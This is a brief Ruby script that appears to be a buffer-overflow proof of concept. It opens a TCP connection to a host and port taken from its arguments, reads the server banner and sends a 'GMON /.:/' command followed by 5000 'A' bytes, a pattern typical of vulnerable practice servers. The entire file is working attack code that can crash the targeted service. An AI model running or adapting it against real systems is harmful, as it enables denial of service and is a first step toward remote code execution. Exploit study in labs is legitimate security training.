#!/usr/bin/env ruby

require 'socket'

baddata = "GMON /.:/"
baddata += "\x41" * 5000

host = ARGV[0]
port = ARGV[1]

socket = TCPSocket.open(host, port)
socket.recv(1024)
serverdata = socket.recv(1024)
puts "#{serverdata}"

socket.send(baddata, 0)